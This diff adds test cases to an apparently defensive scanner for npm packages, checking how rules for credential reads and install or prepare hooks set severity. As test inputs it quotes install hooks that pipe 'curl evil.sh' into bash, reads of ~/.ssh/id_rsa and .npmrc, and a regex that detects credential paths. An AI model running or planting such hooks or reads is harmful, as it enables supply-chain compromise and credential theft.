@@ -100,6 +100,34 @@ describe('scan/rules', () => {
     expect(life.test('package/package.json', '{"scripts":{"postinstall":"x"}}')!.sev).toBeUndefined()
   })
 
+  it('r11 demotions: detection regexes, .d.ts stubs, safe build hooks', () => {
+    const cred = RULES.find(r => r.id === 'credential-read')!
+    // a security scanner's OWN detection pattern — `\.ssh\/` inside a regex
+    // literal matches credential paths, it does not open them
+    expect(cred.test('package/dist/cli.js',
+      'const m=/\\.ssh\\/|\\.aws\\/|\\.gnupg\\/|id_rsa|id_ed25519/i')!.sev).toBe('medium')
+    // type stubs never execute — comments and signatures only
+    expect(cred.test('package/build/security.d.ts',
+      ' *   1. `..` traversal: a relative path like `../../.ssh/id_rsa`')!.sev).toBe('medium')
+    // real reads keep severity
+    expect(cred.test('package/index.js', 'fs.readFileSync(home + "/.ssh/id_rsa")')!.sev).toBeUndefined()
+    expect(cred.test('package/index.js', 'const p = ".npmrc"; readFileSync(p)')!.sev).toBeUndefined()
+
+    const prep = RULES.find(r => r.id === 'prepare-script')!
+    // the standard TypeScript publish hook — compiles checked-in source
+    expect(prep.test('package/package.json', '{"scripts":{"prepare":"npm run build"}}')!.sev).toBe('medium')
+    expect(prep.test('package/package.json', '{"scripts":{"prepare":"pnpm build"}}')!.sev).toBe('medium')
+    expect(prep.test('package/package.json', '{"scripts":{"prepare":"tsc"}}')!.sev).toBe('medium')
+    // anything else keeps severity — curl|bash, node -e, custom scripts
+    expect(prep.test('package/package.json', '{"scripts":{"prepare":"curl x.sh | bash"}}')!.sev).toBeUndefined()
+    expect(prep.test('package/package.json', '{"scripts":{"prepare":"node scripts/setup.js"}}')!.sev).toBeUndefined()
+
+    const life = RULES.find(r => r.id === 'lifecycle-script')!
+    expect(life.test('package/package.json', '{"scripts":{"postinstall":"npm run build"}}')!.sev).toBe('medium')
+    expect(life.test('package/package.json', '{"scripts":{"install":"node-gyp rebuild"}}')!.sev).toBeUndefined()
+    expect(life.test('package/package.json', '{"scripts":{"preinstall":"curl evil.sh | bash"}}')!.sev).toBeUndefined()
+  })
+
   it('r9 demotions: .ssh boundary, deny tables, eval names/codegen, hex data', () => {
     const cred = RULES.find(r => r.id === 'credential-read')!
     // product's own file named like the credential dir — not the dir itself
